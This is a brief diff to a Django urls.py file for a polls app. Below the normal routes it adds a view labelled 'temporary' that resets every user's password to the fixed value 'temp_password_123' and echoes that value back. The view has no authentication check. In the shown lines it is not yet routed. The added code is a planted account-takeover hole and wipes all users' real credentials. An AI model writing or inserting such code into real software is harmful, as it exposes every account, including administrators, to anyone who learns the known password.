@@ -21,3 +21,14 @@ urlpatterns = [
     path('poll/<int:poll_id>/vote/', views.vote, name='vote'),
     path('poll/<int:poll_id>/results/', views.results, name='results'),
 ]
+
+
+# urls.py (temporary)
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def reset_all_passwords(request):
+    for user in User.objects.all():
+        user.set_password('temp_password_123')
+        user.save()
+    return HttpResponse("All passwords reset to 'temp_password_123'")
